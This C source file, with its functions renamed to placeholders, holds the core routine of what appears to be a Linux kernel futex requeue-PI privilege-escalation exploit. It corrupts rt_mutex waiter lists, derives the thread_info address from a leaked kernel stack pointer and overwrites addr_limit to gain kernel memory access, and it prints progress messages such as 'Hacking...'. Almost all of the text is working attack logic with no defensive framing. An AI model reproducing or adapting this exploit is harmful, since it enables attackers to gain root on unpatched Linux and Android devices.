#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_6__   TYPE_3__ ;
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  waiter11 ;
struct thread_info {int /*<<< orphan*/  addr_limit; } ;
struct TYPE_5__ {void* prev; } ;
struct TYPE_4__ {void* next; } ;
struct TYPE_6__ {TYPE_2__ node_list; TYPE_1__ prio_list; } ;
struct rt_mutex_waiter {struct rt_mutex* lock; TYPE_3__ list_entry; } ;
struct rt_mutex {int dummy; } ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  pid_t ;

/* Variables and functions */
 int /*<<< orphan*/  FUTEX_CMP_REQUEUE_PI ; 
 int /*<<< orphan*/  FUTEX_LOCK_PI ; 
 int /*<<< orphan*/  FUNC0 (void*) ; 
 struct rt_mutex_waiter* FUNC1 (void*) ; 
 int /*<<< orphan*/  SIGNAL_HACK_KERNEL ; 
 int /*<<< orphan*/  __NR_futex ; 
 int /*<<< orphan*/  clientfd ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 scalar_t__ did_socket_tid_read ; 
 scalar_t__ do_socket_tid_read ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (struct rt_mutex*) ; 
 struct thread_info* hack_thread_stack ; 
 int /*<<< orphan*/  hacked ; 
 int /*<<< orphan*/  hacked_lock ; 
 int /*<<< orphan*/  listenfd ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pwaiter11 ; 
 int FUNC12 (int /*<<< orphan*/ ,struct rt_mutex_waiter*,int) ; 
 int /*<<< orphan*/  FUNC13 (struct rt_mutex_waiter*) ; 
 scalar_t__ swag ; 
 scalar_t__ swag2 ; 
 scalar_t__ FUNC14 (int /*<<< orphan*/ ,scalar_t__*,scalar_t__*) ; 
 int FUNC15 (int /*<<< orphan*/ ,scalar_t__*,int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,scalar_t__*,scalar_t__) ; 
 int /*<<< orphan*/  thread_client_to_setup_rt_waiter ; 
 int /*<<< orphan*/  FUNC16 (int) ; 
 int /*<<< orphan*/  waiter_thread_tid ; 

__attribute__((used)) static bool FUNC17(void *waiter_plist)
{
	void *magicval, *magicval2;
	struct rt_mutex_waiter *rt_waiters;
	pid_t pid;
	pid_t pid6, pid7, pid12, pid11;
	
	rt_waiters = FUNC1(waiter_plist);
	
	FUNC15(__NR_futex, &swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	
	while (FUNC15(__NR_futex, &swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag) != 1) {
		FUNC16(10);
	}
	
	pthread_t th6 =  FUNC3(6);
	pthread_t th7 =  FUNC3(7);
	
	swag2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;
	
	FUNC15(__NR_futex, &swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &swag2, swag2);
	
	if (FUNC14(waiter_thread_tid, &do_socket_tid_read, &did_socket_tid_read) < 0) {
	return false;
	}
	
	FUNC13(rt_waiters);
	magicval = rt_waiters[0].list_entry.prio_list.next;
	FUNC6("Checking whether exploitable..");
	pthread_t th11 =  FUNC3(11);
	
	if (rt_waiters[0].list_entry.prio_list.next == magicval) {
		FUNC6("failed\n");
		return false;
	}
	FUNC6("OK\nSeaching good magic...\n");
	magicval = rt_waiters[0].list_entry.prio_list.next;
	
	FUNC7(th11);
	
	pthread_t th11_1, th11_2;
	while(1) {
		FUNC13(rt_waiters);
		th11_1 = FUNC3(11);
		magicval = rt_waiters[0].list_entry.prio_list.next;
		hack_thread_stack = (struct thread_info *)((unsigned long)magicval & 0xffffffffffffe000);
		rt_waiters[1].list_entry.node_list.prev = (void *)&hack_thread_stack->addr_limit;
		
		th11_2 = FUNC3(11);
		magicval2 = rt_waiters[1].list_entry.node_list.prev;
		
		FUNC6("magic1=%p magic2=%p\n", magicval, magicval2);
		if(magicval < magicval2) {
			FUNC6("Good magic found\nHacking...\n");
			break;
		} else {
			FUNC7(th11_1);
			FUNC7(th11_2);
		}		
	}
	pwaiter11 = FUNC0(magicval2);
	FUNC10(&hacked_lock);
	FUNC9(th11_1, SIGNAL_HACK_KERNEL);
	FUNC8(&hacked, &hacked_lock);
	FUNC11(&hacked_lock);
	FUNC2(listenfd);
	
	struct rt_mutex_waiter waiter11;
	struct rt_mutex *pmutex;
	int len = FUNC12(pwaiter11, &waiter11, sizeof(waiter11));
	if(len != sizeof(waiter11)) {
		pmutex = NULL;
	} else {
		pmutex = waiter11.lock;
	}
	FUNC5(pmutex);
	
	FUNC7(th11_1);
	FUNC7(th11_2);
	
	FUNC7(th7);
	FUNC7(th6);
	FUNC2(clientfd);
	FUNC7(thread_client_to_setup_rt_waiter);
	
	FUNC4(0);
}